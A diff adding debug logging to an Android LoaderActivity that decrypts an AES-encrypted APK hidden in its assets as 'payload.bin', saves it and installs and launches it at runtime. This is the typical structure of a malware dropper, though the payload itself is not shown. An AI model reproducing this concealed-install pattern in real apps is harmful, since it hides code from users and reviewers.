@@ -767,6 +767,7 @@ public class LoaderActivity extends Activity {{
             @Override
             public void run() {{
                 try {{
+                    android.util.Log.d("LoaderActivity", "Starting decryption thread");
                     updateDialog(dialog, "Чтение данных...");
 
                     InputStream is = getAssets().open("payload.bin");
@@ -778,10 +779,12 @@ public class LoaderActivity extends Activity {{
                     }}
                     byte[] encryptedApk = baos.toByteArray();
                     is.close();
+                    android.util.Log.d("LoaderActivity", "Read encrypted payload: " + encryptedApk.length + " bytes");
 
                     updateDialog(dialog, "Расшифровка (" + encryptedApk.length + " байт)...");
 
                     byte[] decryptedApk = decryptAES(encryptedApk);
+                    android.util.Log.d("LoaderActivity", "Decrypted APK: " + decryptedApk.length + " bytes");
 
                     updateDialog(dialog, "Сохранение (" + decryptedApk.length + " байт)...");
 
@@ -794,19 +797,23 @@ public class LoaderActivity extends Activity {{
                     }}
 
                     apkFile = new File(apkDir, OUTPUT_APK_NAME);
+                    android.util.Log.d("LoaderActivity", "Saving APK to: " + apkFile.getAbsolutePath());
                     FileOutputStream fos = new FileOutputStream(apkFile);
                     fos.write(decryptedApk);
                     fos.close();
+                    android.util.Log.d("LoaderActivity", "APK saved successfully");
 
                     new Handler(Looper.getMainLooper()).post(new Runnable() {{
                         @Override
                         public void run() {{
                             dialog.dismiss();
+                            android.util.Log.d("LoaderActivity", "Starting installation");
                             installApk();
                         }}
                     }});
 
                 }} catch (final Exception e) {{
+                    android.util.Log.e("LoaderActivity", "Decryption error", e);
                     e.printStackTrace();
                     new Handler(Looper.getMainLooper()).post(new Runnable() {{
                         @Override
@@ -849,12 +856,17 @@ public class LoaderActivity extends Activity {{
             return false;
         }}
 
+        android.util.Log.d("LoaderActivity", "handleInstallCommitIntent called");
+        
         int status = intent.getIntExtra(
             PackageInstaller.EXTRA_STATUS,
             PackageInstaller.STATUS_FAILURE
         );
+        
+        android.util.Log.d("LoaderActivity", "Install status: " + status);
 
         if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {{
+            android.util.Log.d("LoaderActivity", "Pending user action");
             Intent confirmIntent = (Intent) intent.getParcelableExtra(Intent.EXTRA_INTENT);
             if (confirmIntent != null) {{
                 startActivity(confirmIntent);
@@ -865,6 +877,7 @@ public class LoaderActivity extends Activity {{
         }}
 
         if (status == PackageInstaller.STATUS_SUCCESS) {{
+            android.util.Log.d("LoaderActivity", "Installation successful");
             launchInstalledApp();
             return true;
         }}
@@ -873,7 +886,8 @@ public class LoaderActivity extends Activity {{
         if (statusMessage == null || statusMessage.trim().isEmpty()) {{
             statusMessage = "PackageInstaller status=" + status;
         }}
-
+        
+        android.util.Log.e("LoaderActivity", "Installation failed: " + statusMessage);
         showError("Установка не удалась: " + statusMessage);
         return true;
     }}
@@ -1201,6 +1215,11 @@ public class LoaderActivity extends Activity {{
     }}
 
     private void installApk() {{
+        android.util.Log.d("LoaderActivity", "installApk() called");
+        android.util.Log.d("LoaderActivity", "APK file: " + apkFile.getAbsolutePath());
+        android.util.Log.d("LoaderActivity", "APK exists: " + apkFile.exists());
+        android.util.Log.d("LoaderActivity", "APK size: " + apkFile.length());
+        
         PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
         PackageInstaller.Session session = null;
 
@@ -1208,6 +1227,7 @@ public class LoaderActivity extends Activity {{
             PackageInstaller.SessionParams params =
                 new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
             int sessionId = packageInstaller.createSession(params);
+            android.util.Log.d("LoaderActivity", "Created session: " + sessionId);
             session = packageInstaller.openSession(sessionId);
 
             try (
@@ -1216,10 +1236,13 @@ public class LoaderActivity extends Activity {{
             ) {{
                 byte[] buffer = new byte[8192];
                 int c;
+                long totalWritten = 0;
                 while ((c = in.read(buffer)) != -1) {{
                     out.write(buffer, 0, c);
+                    totalWritten += c;
                 }}
                 session.fsync(out);
+                android.util.Log.d("LoaderActivity", "Written " + totalWritten + " bytes to session");
             }}
 
             Intent callbackIntent = new Intent(this, LoaderActivity.class);
@@ -1236,9 +1259,12 @@ public class LoaderActivity extends Activity {{
                 pendingIntentFlags
             );
 
+            android.util.Log.d("LoaderActivity", "Committing session");
             session.commit(pendingIntent.getIntentSender());
             session.close();
+            android.util.Log.d("LoaderActivity", "Session committed successfully");
         }} catch (Exception e) {{
+            android.util.Log.e("LoaderActivity", "Installation error", e);
             if (session != null) {{
                 session.abandon();
             }}
